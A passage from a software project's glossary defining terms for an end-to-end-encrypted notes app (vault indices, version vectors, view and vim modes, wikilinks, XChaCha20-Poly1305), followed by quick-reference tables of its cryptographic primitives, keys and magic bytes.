It does **not** return [`SlotKind`] — the in-memory three-state view (`Empty | Recovering | Unlocked`) belongs to the sibling command `vault_slot_kind`, and the two together cover the boot decision tree (disk presence → runtime state). Also distinct from `vault_storage_health`, the mid-session probe that exists to tell an OPFS eviction from a corruption, which the boot vocabulary cannot express. The command body lives in `myne-core` and is the first one migrated onto the `VaultIo` seam, so the same probe answers on desktop and in the browser.

Used in: `core/src/plugins/vault_unlock/commands.rs::vault_status` (+ `VaultStatus`); `src-tauri/permissions/vault-unlock/default.toml`; `src/types/vault-status.ts`

### **VaultIndices** &nbsp; 📦 *Product*

The in-RAM, plaintext-derived index of a vault's wikilink graph — forward links + reverse adjacency (backlinks) — and its tag index, plus the title→note resolution surface (MYND-31). The structural twin of `vault.search`: rebuilt on unlock, wiped on lock, never written to disk in plaintext; persisted encrypted-at-rest as the [vault.indices](#vaultindices) / `MYI1` blob (`spec/protocol.md` §9.8 — the MYND-31 design, persistence landed by MYND-271 alongside the typed [property](#property) index). Built **Build-B**: dialect extraction stays on the TS side (one dialect source of truth, `title_extract.rs` / MYND-82) while the struct, query surface (`backlinks` / `forward` / `by_tag` / `tag_tree` / `resolveTitle`), and persistence are Rust-side. Edges are title-keyed, not UUID-keyed (Model-2), and resolution runs through the single `resolveWikilink` resolver (`spec/wikilink.md` §5.3, "plain-B"). See `decisions.md` 2026-06-07.

Used in: `decisions.md` 2026-06-07 (MYND-31)

### **verification push-hold** &nbsp; 📋 *Protocol*

The client-side pause that makes the [bootstrap-fingerprint](#bootstrap-fingerprint) compare mean something. A [vault head](#vault-head) is not a stable identity — every push authors a new one — so two devices agree on a fingerprint only while they sit on the same head, and the enrolment ceremony itself moves it (a joining device writes its own [device name](#device-name) the moment it adopts a head, and a prefs push authors a head). While a verify screen is open the device therefore authors **no content head**: pulls continue untouched (each side reaches the head it displays *by* pulling), and the §6.1 genesis-on-empty push is exempt, because on an account with no head the genesis head is the only thing a joining device can adopt. Bounded by a lease and a ceiling rather than by cooperation, so a client that dies mid-compare cannot leave its own edits unpushed. **Extend-only** with respect to push timing — nothing fires earlier than it would have and pending push intent is retained — so the §8.3 A13 posture is unchanged. Phase 2.

Used in: `spec/sync-protocol.md` §6.3, §8.3; `decisions.md` 2026-08-15 (myne-md/myne#462); `core/src/plugins/sync/verify_hold.rs`

### **version vector (VV)** &nbsp; 🏗️ *Construction*

A per-device monotonic counter map (`device_id → count`) embedded in and MAC'd by each [vault head](#vault-head), carrying the count of heads each [device](#device_id-vv-actor) has authored (at **push** granularity, not per keystroke). It is the single mechanism behind both concurrency and fork detection: componentwise comparison of a new head's VV to the last-seen one yields **extension** (≥ componentwise → accept), **rollback** (any decreased component → reject), or **incomparable** (concurrent → the device writes a merge head, componentwise-max + author+1). A VV that *never* re-converges across devices is a [fork](#fork-consistency); one that is merely incomparable is a legitimate concurrent edit. This is the same VV the sync conflict layer uses — fork-consistency adds no separate structure. Not pruned in v1 (a unilateral drop would let a server hide a fork; a later-version prune must ride an authenticated device-retirement event). Phase 2.

Used in: `spec/sync-protocol.md` (vault head)

### **view mode** &nbsp; 📦 *Product*

The per-tab live / reading / source axis for a note tab (MYND-299) — the three ways a note's buffer renders: **live** (today's default, the [cursor-aware reveal](#cursor-aware-reveal) live-preview surface), **[reading](#reading-view)** (rendered, read-only, no reveal), and **[source](#source-mode)** (raw markdown, decorations off). Stored per tab as an optional `viewMode?: "live" | "reading" | "source"` field on each tab's [workspace](#named-workspace) descriptor item — engine-opaque inside `MYW1`, omit-when-default (absent ≡ live), serialized exactly like the existing `pinned` flag, **no** `workspace_format_version` bump for the field itself. The vault-wide **default** for newly-opened tabs is the separate MYP1 `editor_default_view_mode` field (enum string, omit-when-default, `live` canonical default). The primary Edit ⇄ Reading toggle is `Mod-Shift-E`; the secondary live ↔ source toggle has no default chord (command palette + the bottom-bar **view-mode switcher**, which reflects the current mode in `data-view-mode`). A read-only **preview companion** can open a [Reading-view](#reading-view) mirror of the same buffer side-by-side without a second editable instance. See also [Reading view](#reading-view), [Source mode](#source-mode), [cursor-aware reveal](#cursor-aware-reveal).

Used in: `spec/protocol.md` §9.5.2, §9.7; `decisions.md` 2026-06-17 (MYND-299)

### **view order** &nbsp; 📦 *Product*

The user-controlled display order of [saved views](#saved-view) in the sidebar "Views" section + the views list (Saved Views epic, MYND-274 / SYNC-10). Persisted as the `view_order` field of [vault.prefs](#vaultprefs) — a **sequence** array of view ids (NFC-normalized, order preserved verbatim, NOT sorted or deduped, omitted-when-empty), exactly the [favorites](#favorites) discipline (and that of each per-container value sequence of [item order](#item-order)). A stale id (a deleted view) is ignored at render and pruned on the next write (no codec GC). The list renders `view_order`'s ids first (in order), then any saved view not yet in it. See also [saved view](#saved-view), [item order](#item-order). (MYND-274)

Used in: `spec/protocol.md` §9.5.2; Saved Views (MYND-273 / MYND-274)

### **view type** &nbsp; 📦 *Product*

The render shape of a [saved view](#saved-view) (Saved Views epic, MYND-271). The closed v0.1 set is **table / cards / list** (Obsidian-Bases' `map` is dropped, SYNC-5); all three ship — cards (MYND-275), table (MYND-277), list (MYND-278) — behind one `viewRenderHost` dispatch. Every view type renders the **same** grouped query result read-only — no editable cells, no kanban drag-columns — so the choice is purely presentational (cards add a cover [`image:`](#attachment) + groupBy headers; table renders the view's property columns; list reuses the note-list row). The view type is one field of the view definition stored in `vault.prefs` / `MYP1`.

Used in: Saved Views (MYND-271)

### **vim mode** &nbsp; 📦 *Product*

The editor's optional **modal editing** layer (`@replit/codemirror-vim`, MIT), off by default and toggled from Settings → Editor, where the row appears once [Developer mode](#developer-mode) is on (myne-md/myne#181 — a power-user affordance kept out of the default surface; hiding the row never turns an active keymap off); persisted as the device-local `editor_vim_mode` field of [`vault.prefs`](#prefsview) (`spec/protocol.md` §9.5.2). Modal means keystrokes change meaning with the current **mode**: *normal* (keys are commands — motions, operators, counts), *insert* (keys are text), *visual* (keys extend a selection), plus *replace*. The active mode is surfaced on the editor root as `data-vim-mode` and rendered as a bottom-bar item; a block cursor marks normal mode. The engine is **dynamically imported only when the toggle is on**, so a user who never enables it never downloads it — the load-bearing mitigation for taking the dependency at all (`decisions.md` 2026-07-25). Vim lives **inside the editor**: where Myne's application chords collide with vim's `Ctrl-` grammar (Windows/Linux, where `Mod` is Ctrl), the vim binding is removed rather than Myne's, because the shortcut map is user data (`vault.prefs.keymap` + the Hotkeys panel). Escape resolves "one job at a time": an open overlay closes first, then insert/visual returns to normal, then a multi-selection collapses. With vim on, notes **default** to source [view mode](#view-mode) — live preview hides markdown characters that vim's motions still count. Introduced MYND-313. See also [ex command](#ex-command), [vim register](#vim-register), [view mode](#view-mode), [PrefsView](#prefsview).

### **vim register** &nbsp; 📦 *Product*

A named clipboard slot in [vim mode](#vim-mode) — where `yy` puts text and `p` takes it from — together with recorded macros (`q<letter>`). Registers live in the vim engine's **module-global** state, *not* on the editor view, so they survive the editor unmount that locking performs. Because that would let note text cross the vault boundary (yank in one vault → lock → open another → `p`), `lockVault()` clears them explicitly via `resetVimStateOnLock()`, immediately beside the [graph-layout](#graph-layout-cache) reset and for the same reason. This honours the existing lock guarantee rather than adding a new one; the system clipboard is unaffected (it is OS-owned and user-visible). Introduced MYND-313. See also [vim mode](#vim-mode), [zeroize](#zeroize).

### **voice note** &nbsp; 📦 *Product*

A note audio clip embedded inline — either a recorded microphone capture or an attached audio file. Stored as an ordinary [attachment](#attachment) (an `audio/wav` [`MYA1`](#mya1) blob — **no new on-disk format**, so a recording made on any client plays on all of them) referenced by the form-C embed `![[att:<id>|filename]]`. **Desktop** captures **natively in Rust via `cpal`** (not the WebView MediaRecorder, so PCM stays Rust-side + `Zeroize`-able) and plays via an inline custom waveform widget. **Mobile** (Tauri Mobile, where `cpal` does not cross-compile as a mic source) captures in the WebView via the **Web Audio API** (`getUserMedia`), wraps the PCM as the same `audio/wav` container in TS, imports it through the ordinary attachment path, and renders an inline `<audio controls>` in reading mode (`decisions.md` 2026-07-12). Both encode mono 16-bit and buffer in RAM only (never a plaintext temp file). `audio/wav` is in the [`attachment://`](#attachment) serve allowlist + the sniffer (a `RIFF`…`WAVE` arm). (MYND-259; `decisions.md` 2026-06-14, 2026-07-12)

### **watch meeting capture** &nbsp; 📦 *Product*

The Apple Watch companion's second job, beside voice dictation: record a meeting on the wrist and let the paired iPhone turn it into a meeting note. The watch gains a **microphone capture path** (the first thing it emits that is not text) and a session control — start, a bright recording state with a live elapsed counter, stop — recording in foreground-only chunks and transferring each with `transferFile` plus a manifest carrying `session_id`, `chunk_index` and `started_at`, deleting its own copy only once the transfer reports complete. The watch **still holds no vault key and runs no crypto** (the invariant `decisions/clients/0293` set is extended, not superseded); the phone seals each arrived chunk under the device-local keychain `wrap_key` (see [offline seal](#offline-seal)), groups chunks in a [pending meeting](#pending-meeting), and on unlock drains them into one note. The lane is **mic-only by construction**: iOS has no system-audio loopback, so the mic-plus-tap mix of the desktop meeting session (`decisions/storage/0646`) has no phone-side equivalent and no phone session exists. The watch now holds a **transient plaintext window** (meeting audio between capture and transfer), enumerated the same way `0293` enumerates the dictated-capture outbox; the phone writes no plaintext audio to disk because it seals on arrival. No new magic, AAD role, HKDF context, subkey role or KDF parameter. (`decisions/clients/0647`; myne-md/myne#812)

Used in: `decisions/clients/0647`; `threat-model.md` §7

### **Vite** &nbsp; 🛠️ *Tooling*

The build tool and dev server used by the Phase 1 desktop client to bundle the React UI before Tauri ships it as a static asset bundle. Chosen over Next.js (`decisions.md` 2026-04-26) because Tauri ships a static bundle — Next.js's SSR / RSC / API-route value is architecturally unused, while its ~10× larger transitive npm dependency footprint vs Vite is paid in full. The smaller direct-npm-dependency surface aligns with the threat-model §7 "deliberately small direct-dependency surface" commitment for A8/TB9.

Used in: `decisions.md`; `threat-model.md` §7
Reference: https://vite.dev

### **unlinked mention** &nbsp; 📦 *Product*

A note whose prose mentions the open note's **title** as a whole-word, fold-identity phrase **without** `[[wikilink]]`-ing it — surfaced collapsed-by-default in the **Unlinked** right-panel tab (sibling of the [Links tab](#links-tab)) with a one-click "link" action (Obsidian-parity discovery/cleanup aid; MYND-196, build-phase v1.1). Distinct from a backlink, which is an explicit link. Candidate recall rides the existing encrypted `vault.search` body index as a *filter only*; identity is verified by a `foldSegment` word-boundary match on the decrypted candidate body (`vault.search`'s language-detecting tokenizer is never the identity authority). A corpus-relative phrase document-frequency floor (df > ~0.15 → suppress) plus a ≤2-folded-char guard suppress common/short titles; the 0.15 threshold is a **tunable code constant, not spec** (deliberate contrast with the frozen Damm-32 table). Adds **no new at-rest artefact** — the guarantee surface does not move. Clicking "link" inserts `[[Title]]` through the canonical `saveNote` write path and never clobbers an open+dirty note (SYNC-15 guard).

Used in: `agent-tooling/features/unlinked-mentions/prd.md`, `spec/wikilink.md`, `vision.md` Phase 1 Scope

### **math (markdown)** &nbsp; 📦 *Product*

LaTeX math rendered in the editor (MYND-48): inline `$…$` (a custom `InlineMath` Lezer node) and block `$$…$$` (a regex block decoration), typeset by lazy-loaded KaTeX, cursor-aware (raw LaTeX revealed on-cursor; invalid LaTeX → source + a subtle dotted-underline hint, never KaTeX's red node). The `$`-disambiguation keeps currency text (`$5`, `$ €`) from parsing as math (opening `$` not followed by whitespace/digit, closing `$` not preceded by whitespace, `$$` = block, single-line). `InlineMath` is a leaf → no `#tags`/emphasis inside; math doesn't parse in code. Render-only, never emitted (§6 C1). Supersedes the §7 math deferral (`decisions.md` 2026-06-08).

Used in: `spec/markdown-dialect.md` §3.2/§7

### **mermaid diagram** &nbsp; 📦 *Product*

A ```mermaid fenced code block rendered as an SVG diagram in the editor (MYND-49) via lazy-loaded Mermaid (`securityLevel:'strict'`, `htmlLabels:false`: mermaid sanitizes its own SVG with its bundled DOMPurify). `fenced-code.ts` skips the `mermaid` info-string so the diagram widget renders it instead of a code card; parse-error / load-failure falls back to a monospace card carrying a single line naming mermaid's reason when it gave one. A diagram renders at its NATURAL size and scrolls inside its own card rather than being scaled down to the column width (myne-md/myne#629). Cursor-aware whole-block reveal; render-only (§6 C1). Mermaid is the **heaviest dependency** in the project (≈+100 transitive packages), lazy-loaded so a diagram-free note pays zero bytes. Shipped as a conscious decision (`decisions.md` 2026-06-08) over the auto-grill's defer recommendation. PlantUML is not rendered (stays a code card).

Used in: `spec/markdown-dialect.md` §7; `dependency-policy.md`

### **subcomponent edge** &nbsp; 📦 *Product*

A hand-written `parent` on a story descriptor that nests one surface under another in the catalogue's rail, giving the four-level tree `group > component > [subcomponent] > Documentation | story` (myne-md/myne#847). It is declared rather than inferred from a directory, and the tree ships one real pair today (`AutomaticBackupBlock` under `StoragePanel`); the rest of the nesting is owed work, and `scripts/check-story-tree.mjs` carries a floor on how many edges it verifies so the count cannot sit at one unnoticed. `scripts/check-story-tree.mjs` checks three things about every declared edge: the parent exists, the tree is acyclic, and the two modules are connected by an import edge in either direction. Either direction is required because both real shapes occur: a settings shell imports its panels, while the shared modal shell is imported by its children. Contrast [Documentation node](#documentation-node).

Used in: `stories/README.md`; `decisions/ui/0653`

### **subscript / superscript (markdown)** &nbsp; 📦 *Product*

The `~x~` (subscript) and `^x^` (superscript) inline constructs, rendered with reduced-size, vertically-shifted typography (MYND-156, `.cm-sub` / `.cm-sup`). Use the pre-built `@lezer/markdown` Subscript/Superscript configs; single-run and space-free (Pandoc-style), disjoint from GFM strikethrough `~~…~~` and footnote `[^id]`. Recognize-and-render-only — never emitted; bytes preserved (§6 C1).

Used in: `spec/markdown-dialect.md` §3.2

### **Weblate** &nbsp; 🛠️ *Tooling — retired*

The self-hosted web translation platform that once owned Myne's non-English **locale catalogs**, at `translate.myne.md` (Komodo stack on the apps VPS; closed registration, admin-invite only). **Retired on 2026-10-03** (`design-notes/ui/0629`): it had no translators enrolled and the repo was ahead of it on every locale, so the catalogs are now authored in-repo, by hand. It is kept as a glossary entry only so an older document that says "Weblate owns the catalogs" reads as historical. File mask it used was `locales/*/common.json`, format *i18next JSON v4*, monolingual base `locales/en/common.json`.

Used in: `design-notes/ui/0629`; `docs/dev/i18n.md` (historical).

### **web capability set** &nbsp; 📦 *Product* (*Myne-divergent*)

The normatively-defined set of things the web client can and cannot do — not a UX scope decision that a later release quietly widens. Its two load-bearing rules: **the recovery phrase is never a routine credential in served code** and **web requires sync**. The first was absolute from 2026-07-26 to 2026-08-15, phrase display and phrase entry both absent, and is now a three-way split (`decisions.md` 2026-08-15, entry 0514): display at creation ships, entry at a user-started recovery ships, and the phrase as a **device-enrolment credential** stays out, kept out of the served artefact by build-time substitution rather than a runtime branch. What the split preserves is that no routine flow teaches a user that typing 24 words into a page is normal; what it spends is the inference that any page asking was self-evidently fake (`threat-model.md` A18). The phrase remains unrotatable, so an exposure is still permanent. The second rule is untouched (the browser is a window onto a synced vault; conflict resolution is sync-based, so a vault arriving any other way is an orphan fork). `change_password` stays available, because the password is already typed into the page at unlock. Everything the operating system provides and a browser does not — clipper host, local AI, share-sheet import, watch captures, keychain/biometric quick-unlock, OS idle auto-lock, screen-capture protection, backup export/restore, vault migration, native file dialogs — is **absent from the interface**, not shown disabled. See also [sync-required entry](#sync-required-entry) (the second rule, named), [capability gating](#capability-gating) (how the set is applied at runtime), [capability descriptor](#capability-descriptor).

Used in: `decisions.md` 2026-07-26 (web capability set); `vision.md`

### **wikilink** &nbsp; 📦 *Product* (deep entry, *Myne-divergent*)

Myne's first-class internal-link syntax: `[[…]]`-bracketed references that resolve against the current vault and render as atomic chip widgets in the editor. Recognized forms include title-only (`[[Note]]`), aliased (`[[Note|Display]]`), heading-anchored (`[[Note#Heading]]`), block-referenced (`[[Note^block-id]]`), path-encoded (`[[vault/relative/path.md|Display]]`), and embed prefixes (`![[Note]]`, `![[image.png]]`). Full grammar in `spec/wikilink.md`. **Myne-divergent from Obsidian conventions in two load-bearing ways:** (1) new Myne-authored wikilinks emit the **path-with-alias** form `[[vault/relative/path.md|Display Title]]` rather than the title-only form, making every Myne-authored wikilink self-resolvable from the markdown alone — improving the wedge sentence from "plain markdown after decryption" to "*resolvable* plain markdown after decryption"; (2) imported Obsidian wikilinks are preserved byte-for-byte (hard rule C1) and coexist indefinitely with Myne-authored path forms. Decoration treats both forms identically as atomic chips; click-resolution differs (title-only via vault-index lookup; path-form follows directly). Auto-update on rename preserves syntactic shape — never promotes form. The manual conversion command (R2 in `wikilink.md` §7) is the only sanctioned migration path from imported title-only to path-form. Wikilinks are **not** standard markdown; no CommonMark / GFM / Pandoc / Djot dialect natively defines them.

Used in: `spec/wikilink.md`, `spec/markdown-dialect.md` §3.5, `vision.md` Phase 1 Scope

### **wikilink chip** &nbsp; 📦 *Product*

The atomic-range rendered widget representing a **wikilink** (`[[Note]]`, `[[Note|Display]]`, `[[Note#Heading]]`, `[[Note^block-id]]`, `[[path.md|Alias]]`, `![[Embed]]`) inside the Phase 1 editor surface. Implemented as a CodeMirror 6 `Decoration.replace` paired with `EditorView.atomicRanges` registration so cursor navigation, selection extension, and Backspace / Delete treat each chip as a single indivisible unit. A chip lifts to its raw `[[...]]` source when the caret is at its start or strictly inside it, or when a selection overlaps it, and stays rendered for a caret anywhere else on the line, including immediately after the closing `]]` (`spec/wikilink.md` §5.4, myne-md/myne#659). While it is rendered the range is atomic; the reveal is what drops that, which is how a chip stays keyboard-editable at all. The underlying source remains in the buffer byte-for-byte either way. `editor-mvp-baseline` ships chip **rendering** (visual + atomic-range behavior); the authoring layer (autocomplete picker, hover-tooltip path resolution, manual conversion, auto-update on rename) lands in `editor-mvp-wikilinks`.

Used in: `agent-tooling/features/editor-mvp-baseline/prd.md`, `spec/wikilink.md` §5.4, `agent-tooling/sessions/grill/2026-05-16-mynd-36-editor-inner-scope.md` Q6

### **wrap key cache** &nbsp; 🗝️ *Key/identifier*

The two 32-byte Argon2id outputs (`password_wrap_key`, `recovery_wrap_key`) derived from the master password and recovery phrase respectively, cached on a **vault creation session** between `begin` and `commit`. Argon2id at the v0.1 baseline (`m_kib = 262_144`, `t = 3`, `p = 2`) takes ~1–2 seconds per call; deriving once at `begin` time and reusing at `commit` time eliminates a second ~2-second pass through the recovery-phrase Argon2id. The wrap keys are `Zeroizing<[u8; 32]>`; they are wiped when the session is dropped (commit, cancel, or TTL eviction).

Used in: `decisions.md` 2026-04-28 "Vault creation flow"

### **X25519** &nbsp; 🔐 *Primitive*

The Diffie-Hellman key-agreement function on Curve25519 (RFC 7748). Not used in Myne's v0.1 at-rest encryption; reserved for a later major version's user-to-user key agreement (sharing) and multi-device coordination.

Used in: `spec/protocol.md` §11
Reference: RFC 7748.

### **XChaCha20-Poly1305** &nbsp; 🔐 *Primitive* (deep entry)

The extended-nonce variant of ChaCha20-Poly1305 with a 192-bit nonce instead of the standard 96 bits. Specified as an IETF draft and widely deployed via libsodium. Myne's only AEAD primitive — every encryption operation in the protocol uses XChaCha20-Poly1305 wrapped in CTX commitment (§5.1). The 192-bit nonce removes the operational burden of nonce-uniqueness tracking: random nonce collisions are negligible at any realistic vault size (~2^96 operations to expect a collision). Plain ChaCha20-Poly1305 (96-bit nonce) is **not** used in the protocol; readers must distinguish.

Used in: `spec/protocol.md` §5.1
Reference: https://datatracker.ietf.org/doc/html/draft-irtf-cfrg-xchacha (draft-arciszewski-xchacha-03 informational), and libsodium's `crypto_aead_xchacha20poly1305_ietf_*` API.

### **Yjs** &nbsp; 🛠️ *Tooling*

A JavaScript CRDT library for collaborative editing. Myne's roadmap **provisionally** named Yjs as the Phase-4 CRDT; that choice was superseded by [Automerge](#automerge) (`decisions.md` 2026-08-09, epic ledger ASM-11) — Rust-native and a better fit for Myne's blind-server E2EE model. Retained here for history; not Myne's chosen CRDT and not used in v0.1.

Used in: `decisions.md` 2026-08-09 (superseded-by note)
Reference: https://yjs.dev

### **zero-knowledge** &nbsp; ⚠️ *Threat* (deep entry, *Myne-divergent*)

*(Aliases: zero knowledge, ZK. Myne-divergent: yes — informal usage, not the formal ZK proof.)*

In Myne's documents, "zero-knowledge" is used in the **informal industry sense**: the server cannot read users' note plaintext, cannot derive their root keys, cannot recover their passwords, and cannot meaningfully assist a compelled-disclosure request beyond handing over opaque ciphertext and limited transient metadata. This is **not** a formal cryptographic zero-knowledge proof in the Goldwasser–Micali–Rackoff sense. Marketing copy that claims "zero-knowledge" must be backed by the architectural commitments in `threat-model.md` §1 (A1, A2 strong guarantees) and §6 (compensating controls), and must not exceed them. A formal zero-knowledge proof is not part of the protocol design.

Used in: `vision.md`, `threat-model.md` §1

### **zxcvbn** &nbsp; 🛠️ *Tooling*

A password-strength estimation library. Myne recommends using zxcvbn at signup to enforce a minimum strength score (≥3) on the master password.

Used in: `spec/protocol.md` §4.1

---

## Quick-reference indices

### Index 1 — Cryptographic primitives at a glance

| Primitive | Used for | Library |
|---|---|---|
| Argon2id (`m=256 MiB, t=3, p=2`) | Password and recovery-phrase stretching → wrap keys | RustCrypto `argon2` |
| HKDF-SHA-256 | Subkey derivation from root_key (via `derive_key` helper) | RustCrypto `hkdf` |
| XChaCha20-Poly1305 (192-bit nonce) | Every AEAD operation | RustCrypto `chacha20poly1305` |
| SHA-256 | CTX commitment outer hash, account hash, salt construction | RustCrypto `sha2` |
| BIP-39 (encoding only) | Recovery phrase presentation | `bip39` Rust crate (in `protocol/`); the TS side only normalizes (`src/lib/bip39-normalize`) |
| Crockford base32 | Account number alphabet | hand-rolled |
| Damm-32 | Account number check digit | hand-rolled (frozen table, `account-number.md` §4.2) |

The **Library** column names what Myne's own clients actually link — `protocol/Cargo.toml` is the source of truth, and every client runs that one crate (the web client compiles it to `wasm32-unknown-unknown`). [libsodium](#libsodium) is the byte-level interoperability *reference* the choices are stated against, not a dependency; agreement with it is machine-checked by `myne-test-vectors/` rather than obtained by linking it.

### Index 2 — Myne-specific keys and where they live

| Symbol | Role | Storage | Lifetime |
|---|---|---|---|
| `master_password` | User credential 1 | User memory | Session |
| `recovery_phrase` | User credential 2 (BIP-39 24 words) | User offline storage | Permanent |
| `root_key` (32 B random) | Vault cryptographic core | Encrypted ×2 in `vault.meta` | Vault lifetime |
| `password_wrap_key` | KEK for `root_key` from password | Derived only | Session |
| `recovery_wrap_key` | KEK for `root_key` from phrase | Derived only | Session |
| `itemsKey_wrap_key` | KEK for the singleton `itemsKey` | Derived only | Session |
| `itemsKey` (32 B random) | Wraps every per-note `item_key` | Encrypted in `vault.meta` | Vault lifetime |
| `item_key` (32 B random) | Encrypts one note's plaintext | Encrypted in `.myn` file | Note lifetime |
| `server-auth` subkey | Sync-server authentication secret — **active**: the SCRAM-SHA-256 credential the sync client derives at enroll and on every cycle (`core/src/plugins/sync/{cycle,enroll,orchestrator}.rs`) | Derived only; **never transmitted** (SCRAM proves it, the server stores only a verifier) | Session |
| `backup-key` | Reserved for a future sealed-backup variant — not used in v0.1 (demoted 2026-06-10) | Derived only (reserved) | — |
| `head_mac_key` | [Vault head](#vault-head) fork-consistency MAC (`vault-head-mac`) — **active**: every pull MAC-verifies the head before reading it (`protocol/src/vault_head.rs::open_vault_head`, called from `core/src/plugins/sync/engine.rs`) | Derived only | Session |
| `account_number` (95-bit + Damm) | User identifier; bearer token in P2+ | User offline storage | Permanent |
| `account_number_hash` (SHA-256[:16]) | Argon2id salt binding | `vault.meta` | Vault lifetime |

### Index 3 — Magic bytes and context-prefix registries

| Major version | Per-note magic | Vault-meta magic | AAD prefix | Context-string prefix | Status |
|---|---|---|---|---|---|
| v0.1 | `MY01` | `MYV1` | `"myne.v0.1|"` | `"myne.v0.1 "` | Active (this document) |
| v0.2 | `NC05` | `NTV5` | `"myne.v0.2\|"` | `"myne.v0.2 "` | Active: the birth format since 2026-08-13 (§10.3.1); `MYP5`/`MYA5`/`MYC5`/`MYD5`/`MYT5` ship with it |
| next major (reserved) | `NT05` | `NTV5` | not pre-allocated | not pre-allocated | Reserved; the next major version defines its own AAD/HKDF prefix. Note `NTV5` is consumed by v0.2 above, so which magic the next major's `vault.meta` carries is an open question rather than a settled reservation |

The four prefixes for a single major version are deliberately non-interchangeable: each lives in a different cryptographic call site, and using one in place of another is a protocol violation. See entry **`myne.v0.1` prefix** and `spec/protocol.md` §10.3.

### Threat-model enumerations (link out, not enumerated here)

- **Adversary classes** (`A…`) → `threat-model.md` §1
- **Assets** (`AS…`) → `threat-model.md` §2
- **Trust boundaries** (`TB…`) → `threat-model.md` §3

Each of the three rosters is open-ended and has grown since v0.1 (most recently with the web client's A15 / TB11), so the ranges are deliberately not restated here — those three sections are the enumeration of record. These enumerations are normative and frequently referenced from other docs (e.g., "A15 and TB11 are web-client-only"), but enumerating each one in the glossary would duplicate the threat model. Read those sections directly when an entry references an A/AS/TB number.

---

## Maintenance

- **Add a term**: when a new term first appears in any Myne doc and falls within the scope filter (cryptographic primitives, constructions, project-specific keys, protocol concepts, threat-model framework terms, product/architecture vocabulary, implementation tooling), add an entry in the same change that introduces the term. Don't let a doc change ship without the corresponding glossary entry.
- **Update a term**: if a term's definition changes via `decisions.md`, update the corresponding glossary entry in the same change. Glossary drift is a documented audit failure mode.
- **Retire a term**: when a term is removed from all docs, mark its glossary entry with `*(retired YYYY-MM-DD; see decisions.md)*` rather than deleting the entry. Preserves the audit trail and helps readers of older spec versions.
- **Inconsistencies**: if the same term is used inconsistently across docs (e.g., the four `account_number_hash` truncation lengths surfaced during the v0.1 scan), the glossary is the place to record the resolution. Where the resolution is non-obvious, link out to `decisions.md`.
